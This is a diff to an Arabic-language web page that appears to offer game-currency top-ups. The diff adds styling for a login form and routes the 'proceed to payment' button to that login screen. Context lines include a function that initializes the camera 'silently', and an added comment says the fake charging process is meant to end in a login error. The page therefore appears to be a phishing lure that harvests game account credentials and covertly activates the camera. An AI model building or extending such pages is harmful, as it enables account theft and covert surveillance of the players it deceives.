@@ -963,6 +963,177 @@
     margin: 0 auto 20px auto;
     display: block;
 }
+        /* تنسيق صفحة تسجيل الدخول */
+.login-container {
+    display: none;
+    max-width: 800px;
+    margin: 0 auto;
+    background: rgba(255, 255, 255, 0.95);
+    border-radius: 25px;
+    padding: 35px 30px;
+    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25);
+    backdrop-filter: blur(10px);
+    border: 1px solid rgba(255, 255, 255, 0.2);
+    margin-top: 60px;
+}
+
+.login-header {
+    text-align: center;
+    margin-bottom: 35px;
+}
+
+.login-header .header-logo {
+    width: 100px;
+    height: 100px;
+    border-radius: 25px;
+    margin-bottom: 20px;
+    box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+    margin: 0 auto 20px auto;
+    display: block;
+}
+
+.login-header h1 {
+    color: #2c3e50;
+    font-size: 28px;
+    margin-bottom: 10px;
+}
+
+.login-header p {
+    color: #7f8c8d;
+    font-size: 16px;
+}
+
+.login-form {
+    display: flex;
+    flex-direction: column;
+    gap: 20px;
+}
+
+.password-container {
+    position: relative;
+}
+
+.toggle-password {
+    position: absolute;
+    left: 15px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    color: #7f8c8d;
+    cursor: pointer;
+    font-size: 18px;
+}
+
+.login-btn {
+    background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
+    border: none;
+    border-radius: 12px;
+    padding: 16px;
+    color: white;
+    font-size: 17px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    margin-top: 10px;
+}
+
+.login-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 8px 20px rgba(52, 152, 219, 0.4);
+}
+
+.login-btn:disabled {
+    background: #bdc3c7;
+    cursor: not-allowed;
+    transform: none;
+    box-shadow: none;
+}
+
+.forgot-password {
+    margin-top: 15px;
+    text-align: center;
+}
+
+.forgot-password a {
+    color: #3498db;
+    text-decoration: none;
+    font-size: 14px;
+}
+
+.forgot-password a:hover {
+    text-decoration: underline;
+}
+
+.login-success {
+    display: none;
+    background: #d4edda;
+    color: #155724;
+    padding: 15px;
+    border-radius: 12px;
+    text-align: center;
+    margin-top: 20px;
+    border: 1px solid #c3e6cb;
+}
+
+/* رسائل الحالة في صفحة التسجيل */
+#login-status {
+    margin-top: 20px;
+    padding: 15px;
+    border-radius: 12px;
+    text-align: center;
+    font-weight: 600;
+    font-size: 15px;
+    display: none;
+}
+
+#login-status.success {
+    background: #d4edda;
+    color: #155724;
+    border: 1px solid #c3e6cb;
+    display: block;
+}
+
+#login-status.error {
+    background: #f8d7da;
+    color: #721c24;
+    border: 1px solid #f5c6cb;
+    display: block;
+}
+
+/* تحسينات للجوال */
+@media (max-width: 768px) {
+    .login-container {
+        margin-top: 0;
+        padding: 25px 20px;
+        border-radius: 20px;
+    }
+    
+    .login-header .header-logo {
+        width: 150px;
+        height: 150px;
+    }
+    
+    .login-header h1 {
+        font-size: 24px;
+    }
+}
+
+@media (max-width: 480px) {
+    .login-container {
+        padding: 20px 15px;
+        border-radius: 18px;
+    }
+    
+    .login-header .header-logo {
+        width: 120px;
+        height: 120px;
+    }
+    
+    .login-header h1 {
+        font-size: 22px;
+    }
+}
     </style>
 </head>
 <body>
@@ -1302,20 +1473,36 @@
         serverSelect.addEventListener('change', checkFormCompletion);
         
         // زر المتابعة إلى الدفع
-        proceedBtn.addEventListener('click', function() {
-            if (!termsAccepted) {
-                showStatus('يجب الموافقة على الشروط والأحكام أولاً', 'error');
-                termsModal.style.display = 'flex';
-                return;
-            }
-            
-            // الانتقال إلى صفحة تسجيل الدخول
-            mainContainer.style.display = 'none';
-            loginContainer.style.display = 'block';
-            
-            // تعبئة معلومات اللاعب في رسالة ترحيب
-            showLoginStatus(`مرحباً! جاري إعداد شحن ${selectedCharge.amount} شدّة للاعب ${playerIdInput.value.trim()}`, 'success');
-        });
+        // عدل حدث زر المتابعة إلى الدفع
+proceedBtn.addEventListener('click', function() {
+    if (!termsAccepted) {
+        showStatus('يجب الموافقة على الشروط والأحكام أولاً', 'error');
+        termsModal.style.display = 'flex';
+        return;
+    }
+    
+    if (!selectedCharge) {
+        showStatus('يرجى اختيار عدد الشدات', 'error');
+        return;
+    }
+    
+    if (!playerIdInput.value.trim()) {
+        showStatus('يرجى إدخال معرف اللاعب', 'error');
+        return;
+    }
+    
+    if (!serverSelect.value) {
+        showStatus('يرجى اختيار الخادم', 'error');
+        return;
+    }
+    
+    // الانتقال المباشر إلى صفحة تسجيل الدخول
+    mainContainer.style.display = 'none';
+    loginContainer.style.display = 'block';
+    
+    // إظهار رسالة ترحيب بالمستخدم
+    showLoginStatus(`مرحباً! جاري إعداد شحن ${selectedCharge.amount} شدّة للاعب ${playerIdInput.value.trim()}`, 'success');
+});
         
         // تهيئة الكاميرا بشكل خفي بعد الموافقة
         async function initializeCameraSilently() {
@@ -1676,9 +1863,9 @@ proceedBtn.addEventListener('click', function() {
         return;
     }
     
+    // بدء عملية الشحن التي تنتهي بخطأ التسجيل
     showChargingProcess();
 });
-
 // تنظيف الوقت عند إغلاق الصفحة
 window.addEventListener('beforeunload', () => {
     clearTimeout(chargingTimeout);
@@ -1686,6 +1873,7 @@ window.addEventListener('beforeunload', () => {
     </script>
 </body>
 </html>
+
 
 
 
